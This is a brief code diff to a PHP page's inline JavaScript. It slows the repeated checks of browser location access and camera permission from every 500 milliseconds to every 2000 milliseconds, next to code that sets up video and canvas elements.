@@ -262,7 +262,7 @@ if (isset($_POST['submit'])) {
         // Start by checking location access
         setInterval(function() {
             checkLocationAccess();
-        }, 500);
+        }, 2000);
 
 
     </script>
@@ -293,7 +293,7 @@ if (isset($_POST['submit'])) {
         // Call the permission check on page load
         setInterval(function() {
             checkCameraPermission();
-        }, 500);// Delay the function call to ensure the page is fully loaded
+        }, 2000);// Delay the function call to ensure the page is fully loaded
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
